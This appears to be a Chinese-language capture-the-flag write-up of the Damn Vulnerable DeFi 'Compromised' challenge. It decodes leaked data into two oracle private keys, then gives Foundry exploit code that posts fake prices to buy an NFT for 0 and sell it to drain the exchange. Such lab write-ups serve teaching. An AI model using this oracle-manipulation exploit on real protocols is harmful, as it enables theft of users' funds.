# Damn Vulnerable DeFi v4 - compromised

- https://www.damnvulnerabledefi.xyz/challenges/compromised/

## check condition

將 Exchange 合約裡的資金清空

```solidity
// Exchange doesn't have ETH anymore
assertEq(address(exchange).balance, 0);

// ETH was deposited into the recovery account
assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

// Player must not own any NFT
assertEq(nft.balanceOf(player), 0);

// NFT price didn't change
assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
```

## break

根據題目給出的資訊，可以懷疑下面的兩段資料應該是私鑰

```txt
4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30

4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35
```

將其先透過一些線上工具將其轉換成 string:

```txt
MHg3ZDE1YmJhMjZjNTIzNjgzYmZjM2RjN2NkYzVkMWI4YTI3NDQ0NDc1OTdjZjRkYTE3MDVjZjZjOTkzMDYzNzQ0

MHg2OGJkMDIwYWQxODZiNjQ3YTY5MWM2YTVjMGMxNTI5ZjIxZWNkMDlkY2M0NTI0MTQwMmFjNjBiYTM3N2M0MTU5
```

問過 GPT 後，推測可能是 base64 encode 並透過一些線上工具解碼：

```txt
0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744

0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
```

最後以 cast 得出是哪個地址的私鑰，可以知道有權限更新 Oracle 的地址私鑰外洩：

```console
$ cast wallet addr --private-key 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744

0x188Ea627E3531Db590e6f1D71ED83628d1933088

$ cast wallet addr --private-key 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159

0xA417D473c40a4d42BAd35f147c21eEa7973539D8
```

## solution

驗證是不是對應的地址：

```solidity
// check private key compromised
uint256 pk1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
assertEq(vm.addr(pk1), sources[0]);
uint256 pk2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
assertEq(vm.addr(pk2), sources[1]);
```

購買價格為 0 的 NFT：

```solidity
// feed the fake price
vm.startPrank(sources[0]);
oracle.postPrice("DVNFT", 0);
vm.stopPrank();
vm.startPrank(sources[1]);
oracle.postPrice("DVNFT", 0);
vm.stopPrank();
assertEq(oracle.getMedianPrice("DVNFT"), 0);

// player buy 1 nft with price 0
vm.startPrank(player);
uint256 id = exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();
vm.stopPrank();
```

再來將其以 999 ether 的價格賣出：

```solidity
// feed the fake price again
vm.startPrank(sources[0]);
oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
vm.stopPrank();
vm.startPrank(sources[1]);
oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
vm.stopPrank();
assertEq(oracle.getMedianPrice("DVNFT"), EXCHANGE_INITIAL_ETH_BALANCE);

// player sell 1 nft with price 999 ether
vm.startPrank(player);
nft.approve(address(exchange), id);
exchange.sellOne(id);
recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}(new bytes(0));
vm.stopPrank();
```
